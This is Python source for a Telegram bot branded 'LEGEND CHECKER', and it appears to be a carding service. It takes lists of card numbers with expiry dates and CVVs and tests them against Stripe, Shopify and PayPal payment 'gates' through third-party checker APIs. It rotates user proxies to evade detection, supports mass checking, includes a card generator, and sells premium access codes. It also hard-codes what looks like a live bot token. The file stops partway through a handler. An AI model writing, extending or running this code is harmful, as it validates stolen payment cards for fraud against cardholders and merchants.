import requests
import re
import time
import telebot
from telebot import types
import os
import base64
import user_agent
import json
import random
import string
import html
import threading
from datetime import datetime, timedelta
from urllib.parse import urlparse
from bs4 import BeautifulSoup

from autoshopify import stormxcc
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Aapko 'getuseragent' ki zaroorat nahi hai agar aap 'user_agent' istemal kar rahe hain.
# from getuseragent import UserAgent 

# --- Bot Setup ---
# Load bot token from environment variables for security
BOT_TOKEN = os.getenv('BOT_TOKEN', '7840826807:AAGGZoMn1h-9f-8Q_lALfrmpewReYwUXtKU')
bot = telebot.TeleBot(BOT_TOKEN)

# Owner ID - load from environment or use default
OWNER_ID = int(os.getenv('OWNER_ID', '6637227162'))

# In-memory data storage (no files)
users_data = {}
codes_data = {}
status_data = {'total_checks': 0, 'total_approved': 0, 'users_checked': []}
approved_cards_data = []
sites_data = {}
proxies_data = {}
authorized_groups = []  # List of authorized group IDs

# Mass checking control system
active_mass_checks = {}  # Track active mass checking sessions
stop_flags = {}  # User stop flags
active_checks_lock = threading.Lock()  # Thread-safe access to active_mass_checks
stop_flags_lock = threading.Lock()  # Thread-safe access to stop_flags

# Single check cooldown system (4 second cooldown)
last_single_check = {}  # {user_id: timestamp}
single_check_lock = threading.Lock()
SINGLE_CHECK_COOLDOWN = 4  # 4 seconds cooldown

def check_single_command_cooldown(user_id):
    """Check if user is in cooldown for single check commands. Returns (can_proceed, remaining_time)"""
    with single_check_lock:
        if user_id in last_single_check:
            elapsed = time.time() - last_single_check[user_id]
            if elapsed < SINGLE_CHECK_COOLDOWN:
                remaining = int(SINGLE_CHECK_COOLDOWN - elapsed)
                return False, remaining
        last_single_check[user_id] = time.time()
        return True, 0

def is_group_authorized(chat_id):
    """Check if group is authorized to use the bot"""
    return chat_id in authorized_groups

def check_group_authorization(message):
    """Check if message is from authorized group. Returns True if authorized or private chat, False otherwise"""
    # Always allow private chats
    if message.chat.type == 'private':
        return True
    
    # Check if group is authorized
    if is_group_authorized(message.chat.id):
        return True
    
    # Group not authorized
    bot.reply_to(message, "❌ This group is not authorized to use this bot.\n\nContact owner to authorize this group.")
    return False

# --- Proxy and Site Rotation Configuration ---
# Proxies removed - Users will add their own via /setproxy
PROXIES = []

# Validate and filter proxies at startup
def validate_proxies():
    """Filter out invalid proxies and return valid ones"""
    valid_proxies = []
    for proxy in PROXIES:
        formatted = format_proxy(proxy)
        if formatted:
            valid_proxies.append(proxy)
    return valid_proxies if valid_proxies else PROXIES

def format_proxy(proxy_string):
    """Convert proxy string to proper format for requests - supports ip:port and user:pass@ip:port"""
    try:
        if not proxy_string:
            return None
            
        # Handle format: user:pass@ip:port
        if '@' in proxy_string:
            user_pass, host_port = proxy_string.split('@')
            username, password = user_pass.split(':')
            ip, port = host_port.split(':')
            # Return in format: http://username:password@ip:port
            return f"http://{username}:{password}@{ip}:{port}"
        else:
            # Handle both formats: ip:port:user:pass or ip:port
            parts = proxy_string.split(':')
            if len(parts) == 4:
                # Format: ip:port:user:pass
                ip, port, username, password = parts
                return f"http://{username}:{password}@{ip}:{port}"
            elif len(parts) == 2:
                # Format: ip:port (no authentication)
                ip, port = parts
                return f"http://{ip}:{port}"
            else:
                return None
    except Exception as e:
        print(f"Proxy parsing error: {e}")
        return None

def test_proxy(proxy_string):
    """Test if proxy is live and get response time and IP info"""
    try:
        formatted_proxy = format_proxy(proxy_string)
        if not formatted_proxy:
            return {'status': 'dead', 'ms': 0, 'ip': 'Unknown', 'error': 'Invalid format'}
        
        proxies = {
            'http': formatted_proxy,
            'https': formatted_proxy
        }
        
        start_time = time.time()
        response = requests.get('https://api.ipify.org?format=json', proxies=proxies, timeout=10)
        end_time = time.time()
        
        if response.status_code == 200:
            ms = int((end_time - start_time) * 1000)
            ip_data = response.json()
            proxy_ip = ip_data.get('ip', 'Unknown')
            return {'status': 'live', 'ms': ms, 'ip': proxy_ip, 'error': None}
        else:
            return {'status': 'dead', 'ms': 0, 'ip': 'Unknown', 'error': f'Status code {response.status_code}'}
    except requests.exceptions.Timeout:
        return {'status': 'dead', 'ms': 0, 'ip': 'Unknown', 'error': 'Timeout'}
    except Exception as e:
        return {'status': 'dead', 'ms': 0, 'ip': 'Unknown', 'error': str(e)}

# Shopify sites removed - Users will add their own via /addsite
SHOPIFY_SITES = []


# User management functions (in-memory)
def load_users():
    """Get users data from memory"""
    return users_data

def save_users(data):
    """Save users data to memory"""
    global users_data
    users_data.update(data)

def load_codes():
    """Get codes data from memory"""
    return codes_data

def save_codes(data):
    """Save codes data to memory"""
    global codes_data
    codes_data.update(data)

def load_status():
    """Get status data from memory"""
    return status_data

def save_status(data):
    """Save status data to memory"""
    global status_data
    status_data.update(data)

def get_user_status(user_id):
    """Get user status (free, premium, owner)"""
    if user_id == OWNER_ID:
        return 'owner'
    
    users = load_users()
    user_data = users.get(str(user_id), {})
    
    if 'premium_until' in user_data:
        # Check if premium is still valid
        premium_until = datetime.fromisoformat(user_data['premium_until'])
        if datetime.now() < premium_until:
            return 'premium'
        else:
            # Premium expired, remove it
            del user_data['premium_until']
            users[str(user_id)] = user_data
            save_users(users)
    
    return 'free'

def animate_loading(chat_id, message_id, gate_name, stop_event):
    """Animate loading progress bar during checking"""
    frames = [
        f"⏳ CHECKING {gate_name} ■□□□□",
        f"⏳ CHECKING {gate_name} ■■□□□",
        f"⏳ CHECKING {gate_name} ■■■□□",
        f"⏳ CHECKING {gate_name} ■■■■□",
        f"⏳ CHECKING {gate_name} ■■■■■"
    ]
    
    frame_idx = 0
    while not stop_event.is_set():
        try:
            bot.edit_message_text(
                frames[frame_idx],
                chat_id=chat_id,
                message_id=message_id
            )
            frame_idx = (frame_idx + 1) % len(frames)
            time.sleep(0.8)
        except:
            pass

def get_user_limits(user_id):
    """Get user limits based on status"""
    status = get_user_status(user_id)
    
    if status == 'owner':
        return {'text': float('inf'), 'file': float('inf')}  # Owner: unlimited
    elif status == 'premium':
        return {'text': 10, 'file': 100}  # Premium: 10 cards for mass commands
    else:  # free
        return {'text': 20, 'file': 100}  # Free users keep 20 card limit

def generate_code(duration):
    """Generate a redeem code"""
    # Generate random code: LEGEND-XXX-XXX-XXX-DURATION
    parts = []
    for _ in range(3):
        part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=3))
        parts.append(part)
    
    code = f"LEGEND-{'-'.join(parts)}-{duration.upper()}"
    return code

def load_approved_cards():
    """Get approved cards from memory"""
    return approved_cards_data

def save_approved_cards(data):
    """Save approved cards to memory"""
    global approved_cards_data
    approved_cards_data = data

def load_sites():
    """Get sites data from memory"""
    return sites_data

def save_sites(data):
    """Save sites data to memory"""
    global sites_data
    sites_data.update(data)

def get_user_sites(user_id):
    """Get user's shopify sites"""
    return sites_data.get(str(user_id), [])

def load_user_proxies():
    """Get user proxies from memory"""
    return proxies_data

def save_user_proxies(data):
    """Save user proxies to memory"""
    global proxies_data
    proxies_data.update(data)

def get_user_proxy(user_id):
    """Get user's set proxy (returns list)"""
    return proxies_data.get(str(user_id), [])

# --- Proxy and Site Rotation Functions ---
import itertools

# Validate proxies and initialize cycles
FILTERED_PROXIES = validate_proxies()
_proxy_cycle = itertools.cycle(FILTERED_PROXIES) if FILTERED_PROXIES else None
_site_cycle = itertools.cycle(SHOPIFY_SITES) if SHOPIFY_SITES else None

# Global dictionary to store user-specific proxy cycles
_user_proxy_cycles = {}

def remove_dead_proxy(user_id, proxy):
    """Remove dead proxy and notify user"""
    try:
        user_id_str = str(user_id)
        proxies_data = load_user_proxies()
        user_proxies = proxies_data.get(user_id_str, [])
        
        if proxy in user_proxies:
            user_proxies.remove(proxy)
            proxies_data[user_id_str] = user_proxies
            save_user_proxies(proxies_data)
            
            # Reset proxy cycle for this user
            global _user_proxy_cycles
            if user_id_str in _user_proxy_cycles:
                del _user_proxy_cycles[user_id_str]
            
            # Notify user via DM
            try:
                msg = f"⚠️ <b>Proxy Status Alert</b>\n\n"
                msg += f"Your proxy has been detected as dead and has been automatically removed.\n\n"
                msg += f"<b>Removed Proxy:</b>\n<code>{proxy[:20]}...</code>\n\n"
                # Get user status for limit display
                user_status_temp = get_user_status(user_id)
                max_proxy_display = "∞" if user_status_temp == 'owner' else "50"
                msg += f"<b>Remaining Proxies:</b> {len(user_proxies)}/{max_proxy_display}\n\n"
                msg += f"Use /setproxy to add new proxies."
                bot.send_message(user_id, msg, parse_mode='HTML')
            except Exception as e:
                print(f"Failed to notify user {user_id} about dead proxy: {e}")
    except Exception as e:
        print(f"Error removing dead proxy: {e}")

def get_next_proxy(user_id=None):
    """Get next proxy from rotation - prefer user proxy over owner proxies. Rotation only used if >1 proxy"""
    # Check if user has set their own proxy/proxies
    if user_id:
        user_proxies = get_user_proxy(user_id)
        if user_proxies:
            # If user has only 1 proxy, return it directly (no rotation)
            if len(user_proxies) == 1:
                return user_proxies[0]
            
            # If user has multiple proxies, use rotation
            global _user_proxy_cycles
            user_id_str = str(user_id)
            
            if user_id_str not in _user_proxy_cycles:
                _user_proxy_cycles[user_id_str] = itertools.cycle(user_proxies)
            
            return next(_user_proxy_cycles[user_id_str])
    
    # Fall back to owner's proxy rotation
    return next(_proxy_cycle) if _proxy_cycle else None

# Global dictionary to store user-specific site cycles
_user_cycles = {}

def get_next_site(user_id=None):
    """Get next site from rotation - prefer user sites over global rotation"""
    # Prefer user-added sites if present; else global rotation
    user_sites = get_user_sites(user_id) if user_id else []
    if user_sites:
        global _user_cycles
        cyc = _user_cycles.get(user_id)
        if not cyc:
            _user_cycles[user_id] = itertools.cycle(user_sites)
            cyc = _user_cycles[user_id]
        return next(cyc)
    return next(_site_cycle) if _site_cycle else None

# def add_approved_card(user_id, card_data):
#     """Add an approved card to the storage - DISABLED"""
#     # Approved card saving functionality removed as per user request
#     pass

def update_status(user_id, approved_count=0, total_cards_checked=1):
    """Update bot statistics"""
    status = load_status()
    status['total_checks'] += total_cards_checked
    status['total_approved'] += approved_count
    
    if user_id not in status['users_checked']:
        status['users_checked'].append(user_id)
    
    save_status(status)

def get_bin_info(cc):
    """Get BIN information for card"""
    try:
        bin_number = cc[:6]
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        data = response.json()
        
        bin_info = bin_number
        info = data.get('type', '') + ' ' + data.get('brand', '')
        bank = data.get('bank', '')
        country = data.get('country_name', '')
        flag = data.get('country_flag', '🏳️')
        
        return {
            'bin': bin_info.strip(),
            'info': info.strip(),
            'bank': bank.strip(),
            'country': country.strip(),
            'flag': flag
        }
    except:
        bin_number = cc[:6]
        return {
            'bin': bin_number,
            'info': '',
            'bank': '',
            'country': '',
            'flag': '🏳️'
        }


def reg(card_details):
    """Card format ko check karta hai - Multiple formats support"""
    card_details = card_details.strip()
    
    # Multiple separators support: |, space, :, -, /, etc.
    # Extract 16-digit card number, month, year, CVV using regex
    patterns = [
        # Pipe separated: 1234567890123456|12|2025|123
        r'^(\d{15,16})[\|\s](\d{1,2})[\|\s](\d{2,4})[\|\s](\d{3,4})$',
        # Space separated: 1234567890123456 12 2025 123
        r'^(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Colon separated: 1234567890123456:12:2025:123
        r'^(\d{15,16}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Dash separated: 1234567890123456-12-2025-123
        r'^(\d{15,16})-(\d{1,2})-(\d{2,4})-(\d{3,4})$',
        # Slash separated: 1234567890123456/12/2025/123
        r'^(\d{15,16})/(\d{1,2})/(\d{2,4})/(\d{3,4})$',
        # Mixed separators: 1234567890123456|12/25|123
        r'^(\d{15,16})[\|\s](\d{1,2})/(\d{2,4})[\|\s](\d{3,4})$',
        # Comma separated: 1234567890123456,12,2025,123
        r'^(\d{15,16}),(\d{1,2}),(\d{2,4}),(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_details)
        if match:
            card_num, month, year, cvv = match.groups()
            
            # Validate month (01-12)
            if int(month) < 1 or int(month) > 12:
                continue
                
            # Validate year (current year to +20 years)
            current_year = int(str(datetime.now().year)[2:])  # Last 2 digits of current year
            if len(year) == 2:
                year_int = int(year)
                if year_int < current_year or year_int > current_year + 20:
                    continue
            elif len(year) == 4:
                year_int = int(year)
                if year_int < datetime.now().year or year_int > datetime.now().year + 20:
                    continue
            
            # Return in standard pipe format
            return f"{card_num}|{month}|{year}|{cvv}"
    
    return 'None'


def brn6(ccx, proxy=None):
    """Stripe ST checker using external API - NO PROXY"""
    try:
        api_url = f"https://auth-str-2.onrender.com/?lista={ccx}"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return f'Error (HTTP {response.status_code})'
        
        # Check if response is empty
        if not response.text or response.text.strip() == '':
            return 'Error (Empty response from API)'
        
        # Try to parse JSON
        try:
            data = response.json()
        except json.JSONDecodeError:
            return response.text.strip()
        
        # Extract the response message
        if 'message' in data:
            return data['message']
        elif 'response' in data:
            return data['response']
        elif 'status' in data:
            return data['status']
        else:
            return str(data)
    
    except Exception as e:
        print(f"Error during ST check: {e}")
        return f'Error ({str(e)})'




def check_shopify(cc, site, proxy=None):
    """Shopify check function using autoshopify stormxcc API"""
    try:
        # Get proxy for the request - all users get proxy now
        if not proxy:
            proxy = get_next_proxy()
        
        # Format site URL properly
        if not site.startswith(('http://', 'https://')):
            site = 'https://' + site
        
        # Format card properly (MM format required)
        parts = cc.split('|')
        if len(parts) == 4:
            card_num, month, year, cvv = parts
            # Ensure month is 2 digits (01-12)
            month = month.zfill(2)
            formatted_cc = f"{card_num}|{month}|{year}|{cvv}"
        else:
            formatted_cc = cc
        
        # Debug logging
        print(f"DEBUG: Using autoshopify stormxcc API with cc={formatted_cc[:4]}****, site={site}, proxy={proxy[:30] if proxy else 'None'}...")
        
        # Use the new autoshopify stormxcc API
        resp = stormxcc(
            site=site,
            cc=formatted_cc,
            proxy=proxy,
            timeout=30,
        )
        
        # Check if the response was successful
        if resp.status_code != 200:
            return {
                'cc': cc,
                'gateway': 'Shopify',
                'price': 'NA',
                'response': f'HTTP {resp.status_code}',
                'status': 'Error'
            }
        
        try:
            # Try to parse JSON response first
            data = resp.json()
            
            # Extract response fields from the new API
            response_text = data.get('Response', data.get('response', data.get('message', 'NA')))
            gateway = data.get('Gateway', data.get('gateway', 'Shopify'))
            price = data.get('Price', data.get('price', 'NA'))
            
            # Determine status based on response
            response_lower = response_text.lower()
            if any(keyword in response_lower for keyword in ['success', 'approved', 'thank you', 'order success', '3d', 'authentication', 'insufficient fund']):
                status = 'Approved'
            elif any(keyword in response_lower for keyword in ['declined', 'failed', 'card_declined', 'card_error']):
                status = 'Declined'
            else:
                status = 'Error'
            
            return {
                'cc': cc,
                'gateway': gateway,
                'price': price,
                'response': response_text,
                'status': status
            }
            
        except json.JSONDecodeError:
            # If JSON parsing fails, try to extract from text response
            response_text = resp.text[:500] if resp.text else 'No response'
            
            # Determine status from text response
            response_lower = response_text.lower()
            if any(keyword in response_lower for keyword in ['success', 'approved', 'thank you', 'order success', '3d', 'authentication', 'insufficient fund']):
                status = 'Approved'
            elif any(keyword in response_lower for keyword in ['declined', 'failed', 'card_declined', 'card_error']):
                status = 'Declined'
            else:
                status = 'Error'
            
            return {
                'cc': cc,
                'gateway': 'Shopify',
                'price': 'NA',
                'response': response_text,
                'status': status
            }
    
    except Exception as e:
        return {
            'cc': cc,
            'gateway': 'Shopify',
            'price': 'NA',
            'response': f'Exception → {str(e)}',
            'status': 'Error'
        }


def shopify_api_check(cc, site, proxy=None):
    """Shopify check using RockySoon API"""
    try:
        # API URL
        api_url = "https://rockyysoon-fb0f.onrender.com/index.php"
        
        # Format site URL properly
        if not site.startswith(('http://', 'https://')):
            site = 'https://' + site
        
        # Format card properly
        parts = cc.split('|')
        if len(parts) == 4:
            card_num, month, year, cvv = parts
            month = month.zfill(2)
            formatted_cc = f"{card_num}|{month}|{year}|{cvv}"
        else:
            formatted_cc = cc
        
        # Build request params
        params = {
            'site': site,
            'cc': formatted_cc
        }
        
        # Add proxy if provided
        if proxy:
            params['proxy'] = proxy
        
        # Make request
        response = requests.get(api_url, params=params, timeout=30)
        
        if response.status_code != 200:
            return {
                'cc': cc,
                'gateway': 'Shopify',
                'price': 'NA',
                'response': f'HTTP {response.status_code}',
                'status': 'Error'
            }
        
        # Parse response
        try:
            data = response.json()
            response_text = data.get('Response', data.get('response', data.get('message', 'NA')))
            gateway = data.get('Gateway', data.get('gateway', 'Shopify'))
            price = data.get('Price', data.get('price', 'NA'))
            
            # Determine status
            response_lower = str(response_text).lower()
            if any(keyword in response_lower for keyword in ['success', 'approved', 'thank you', 'order success', '3d', 'authentication', 'insufficient fund']):
                status = 'Approved'
            elif any(keyword in response_lower for keyword in ['declined', 'failed', 'card_declined', 'card_error']):
                status = 'Declined'
            else:
                status = 'Error'
            
            return {
                'cc': cc,
                'gateway': gateway,
                'price': price,
                'response': response_text,
                'status': status
            }
        
        except json.JSONDecodeError:
            response_text = response.text[:500] if response.text else 'No response'
            response_lower = response_text.lower()
            
            if any(keyword in response_lower for keyword in ['success', 'approved', 'thank you']):
                status = 'Approved'
            elif any(keyword in response_lower for keyword in ['declined', 'failed']):
                status = 'Declined'
            else:
                status = 'Error'
            
            return {
                'cc': cc,
                'gateway': 'Shopify',
                'price': 'NA',
                'response': response_text,
                'status': status
            }
    
    except Exception as e:
        return {
            'cc': cc,
            'gateway': 'Shopify',
            'price': 'NA',
            'response': f'Exception → {str(e)}',
            'status': 'Error'
        }


def animate_checking(chat_id, message_id, gateway_name, stop_event):
    """Animated loading progress bar for checking"""
    blocks = ['■□□□□', '■■□□□', '■■■□□', '■■■■□', '■■■■■']
    idx = 0
    
    try:
        while not stop_event.is_set():
            animation_text = f"<b>CHECKING {gateway_name}</b> {blocks[idx % len(blocks)]}"
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=animation_text,
                    parse_mode='HTML'
                )
            except:
                pass
            
            idx += 1
            time.sleep(0.3)
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"<b>CHECKING {gateway_name}</b> ■■■■■",
            parse_mode='HTML'
        )
        time.sleep(0.2)
    except:
        pass


# Menu callback handlers
@bot.callback_query_handler(func=lambda call: call.data.startswith('menu_') or call.data.startswith('tools_'))
def handle_menu_callback(call):
    print(f"DEBUG: Callback received: {call.data}")
    bot.answer_callback_query(call.id)
    user_status = get_user_status(call.from_user.id)
    print(f"DEBUG: User status: {user_status}")
    
    if call.data == "menu_gates":
        msg = """<b>🔘 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐆𝐀𝐓𝐄𝐒</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>💳 𝐒𝐓𝐑𝐈𝐏𝐄 𝐀𝐔𝐓𝐇</b>
<code>/st</code> - Single Check

<b>🛒 𝐒𝐇𝐎𝐏𝐈𝐅𝐘</b>
<code>/sh</code> - Single Check (Add proxy & site)

<b>💰 𝐏𝐀𝐘𝐏𝐀𝐋 1$</b>
<code>/p1</code> - Single Check

<b>💵 𝐏𝐀𝐘𝐏𝐀𝐋 2$</b>
<code>/pp</code> - Single Check

━━━━━━━━━━━━━━━━━━━━━━"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        
        bot.edit_message_text(
            msg,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    elif call.data == "menu_mass":
        # Get user-specific limits for display
        if user_status == 'owner':
            limit_text = "∞"
            limit_file = "∞"
            msh_limit = "∞"
            mp1_limit = "∞"
            mpp_limit = "∞"
        elif user_status == 'premium':
            limit_text = "10"
            limit_file = "100"
            msh_limit = "50"
            mp1_limit = "50"
            mpp_limit = "50"
        else:  # free
            limit_text = "20"
            limit_file = "100"
            msh_limit = "20"
            mp1_limit = "20"
            mpp_limit = "20"
        
        msg = f"""<b>📦 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>💳 𝐒𝐓𝐑𝐈𝐏𝐄 𝐌𝐀𝐒𝐒</b>
<code>/mass</code> - Mass Check (Text: {limit_text} / File: {limit_file})

<b>🛒 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐌𝐀𝐒𝐒</b>
<code>/msh</code> - Shopify Mass (Limit: {msh_limit})

<b>💰 𝐏𝐀𝐘𝐏𝐀𝐋 1$ 𝐌𝐀𝐒𝐒</b>
<code>/mp1</code> - Mass Check (Limit: {mp1_limit})

<b>💵 𝐏𝐀𝐘𝐏𝐀𝐋 2$ 𝐌𝐀𝐒𝐒</b>
<code>/mpp</code> - Mass Check (Limit: {mpp_limit})

━━━━━━━━━━━━━━━━━━━━━━

<i>⚠️ Your limits shown above</i>"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        
        bot.edit_message_text(
            msg,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    elif call.data == "menu_tools":
        msg = """<b>🛠 𝐓𝐎𝐎𝐋𝐒</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>📱 User Tools:</b>
• /info - Your account info
• /redeem &lt;code&gt; - Redeem premium code
• /ping - Check bot response
• /bin &lt;number&gt; - BIN lookup

<b>🎲 Card Generator:</b>
• /gen &lt;bin&gt; - Generate 10 cards

<b>Management:</b>
• 🌐 Proxy Management
• 🛒 Site Management

━━━━━━━━━━━━━━━━━━━━━━"""
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_proxy = types.InlineKeyboardButton("🌐 Proxy Management", callback_data="tools_proxy")
        btn_site = types.InlineKeyboardButton("🛒 Site Management", callback_data="tools_site")
        markup.add(btn_proxy, btn_site)
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        
        bot.edit_message_text(
            msg,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    elif call.data == "menu_admins":
        if user_status != 'owner':
            bot.answer_callback_query(
                call.id,
                "🚫 You do not have permission to access admin commands.",
                show_alert=True
            )
            return
        
        msg = """<b>🔐 Admin Commands</b>

<b>Code Generation:</b>
• /key &lt;duration&gt; &lt;quantity&gt; - Generate redeem codes
  Example: /key 3hrs 10

<b>User Management:</b>
• /status - View all users status
• /broadcast &lt;message&gt; - Send message to all users

<b>Bot Management:</b>
• /ping - Check bot response
• Owner has full access to all gates"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
        
        bot.edit_message_text(
            msg,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    elif call.data == "menu_exit":
        bot.edit_message_text(
            "👋 <b>Goodbye!</b>\n\nUse /start to open menu again.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML'
        )
    
    elif call.data == "tools_proxy":
        user_id = str(call.from_user.id)
        user_proxies = get_user_proxy(user_id)
        
        if user_proxies:
            proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(user_proxies)])
            msg = f"""<b>🌐 𝐏𝐑𝐎𝐗𝐘 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>Your Proxies ({len(user_proxies)}):</b>
{proxy_list}

━━━━━━━━━━━━━━━━━━━━━━

<b>Commands:</b>
<code>/setproxy</code> - Add Proxy
<code>/sproxy</code> - Show All Proxies
<code>/rmp &lt;number&gt;</code> - Remove Proxy
<code>/delproxy</code> - Delete All Proxies"""
        else:
            msg = """<b>🌐 𝐏𝐑𝐎𝐗𝐘 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>❌ No Proxies Added</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>Commands:</b>
<code>/setproxy</code> - Add Proxy
<code>/sproxy</code> - Show All Proxies
<code>/rmp &lt;number&gt;</code> - Remove Proxy
<code>/delproxy</code> - Delete All Proxies

<b>Format:</b>
<code>ip:port:user:pass</code>

<b>Example:</b>
<code>/setproxy 1.2.3.4:8080:user:pass</code>"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_tools"))
        
        bot.edit_message_text(
            msg,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    elif call.data == "tools_site":
        user_id = str(call.from_user.id)
        user_sites = get_user_sites(user_id)
        
        if user_sites:
            site_list = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(user_sites)])
            msg = f"""<b>🛒 𝐒𝐈𝐓𝐄 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>Your Sites ({len(user_sites)}):</b>
{site_list}

━━━━━━━━━━━━━━━━━━━━━━

<b>Commands:</b>
<code>/addsite</code> - Add Shopify Site
<code>/showsite</code> - Show All Sites
<code>/rms &lt;number&gt;</code> - Remove Site
<code>/delsites</code> - Delete All Sites"""
        else:
            msg = """<b>🛒 𝐒𝐈𝐓𝐄 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>❌ No Sites Added</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>Commands:</b>
<code>/addsite</code> - Add Shopify Site
<code>/showsite</code> - Show All Sites
<code>/rms &lt;number&gt;</code> - Remove Site
<code>/delsites</code> - Delete All Sites

<b>Example:</b>
<code>/addsite https://shop.example.com</code>"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_tools"))
        
        bot.edit_message_text(
            msg,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    elif call.data == "menu_back":
        # Go back to main menu
        final_msg = """<b>╔══════════════════╗</b>
<b>   𝐋𝐄𝐆𝐄𝐍𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑</b>
<b>╚══════════════════╝</b>

<b>Choose a section:</b>"""
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        # First row - Gates and Mass
        btn_gates = types.InlineKeyboardButton("🔘 Gates", callback_data="menu_gates")
        btn_mass = types.InlineKeyboardButton("📦 Mass", callback_data="menu_mass")
        markup.add(btn_gates, btn_mass)
        
        # Second row - Tools and Admins
        btn_tools = types.InlineKeyboardButton("🛠 Tools", callback_data="menu_tools")
        btn_admins = types.InlineKeyboardButton("🔐 Admins", callback_data="menu_admins")
        markup.add(btn_tools, btn_admins)
        
        # Third row - Join Group
        btn_group = types.InlineKeyboardButton("📢 𝐉𝐎𝐈𝐍 𝐆𝐑𝐎𝐔𝐏", url="https://t.me/AUTOxSHOPIFY")
        markup.add(btn_group)
        
        # Fourth row - Exit
        btn_exit = types.InlineKeyboardButton("❌ Exit", callback_data="menu_exit")
        markup.add(btn_exit)
        
        bot.edit_message_text(
            final_msg,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )

@bot.message_handler(commands=['start'])
def start_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    user_name = message.from_user.first_name
    user_status = get_user_status(message.from_user.id)
    
    if user_status == 'owner':
        status_display = '👑'
    elif user_status == 'premium':
        status_display = '🥇'
    else:
        status_display = '⚡'
    
    sent_msg = bot.reply_to(message, ".")
    
    text = "𝐋𝐄𝐆𝐄𝐍𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑"
    display_text = ""
    
    for i, char in enumerate(text):
        display_text += char
        animation_msg = f"""╔══════════════════╗
  {display_text}
╚══════════════════╝"""
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=sent_msg.message_id,
                text=animation_msg
            )
            time.sleep(0.01)
        except:
            pass
    
    final_msg = f"""<b>╔══════════════════╗</b>
<b>   𝐋𝐄𝐆𝐄𝐍𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑</b>
<b>╚══════════════════╝</b>

<b>Choose a section:</b>"""
    
    # Create professional buttons
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # First row - Gates and Mass
    btn_gates = types.InlineKeyboardButton("🔘 Gates", callback_data="menu_gates")
    btn_mass = types.InlineKeyboardButton("📦 Mass", callback_data="menu_mass")
    markup.add(btn_gates, btn_mass)
    
    # Second row - Tools and Admins
    btn_tools = types.InlineKeyboardButton("🛠 Tools", callback_data="menu_tools")
    btn_admins = types.InlineKeyboardButton("🔐 Admins", callback_data="menu_admins")
    markup.add(btn_tools, btn_admins)
    
    # Third row - Join Group
    btn_group = types.InlineKeyboardButton("📢 𝐉𝐎𝐈𝐍 𝐆𝐑𝐎𝐔𝐏", url="https://t.me/AUTOxSHOPIFY")
    markup.add(btn_group)
    
    # Fourth row - Exit
    btn_exit = types.InlineKeyboardButton("❌ Exit", callback_data="menu_exit")
    markup.add(btn_exit)
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=sent_msg.message_id,
        text=final_msg,
        parse_mode='HTML',
        reply_markup=markup
    )



@bot.message_handler(func=lambda message: message.text.lower().startswith('.mass') or message.text.lower().startswith('/mass'))
def mass_check(message):
    # Check group authorization first
    if not check_group_authorization(message):
        return
    
    user_status = get_user_status(message.from_user.id)
    user_id = str(message.from_user.id)
    
    # Block free users from mass commands
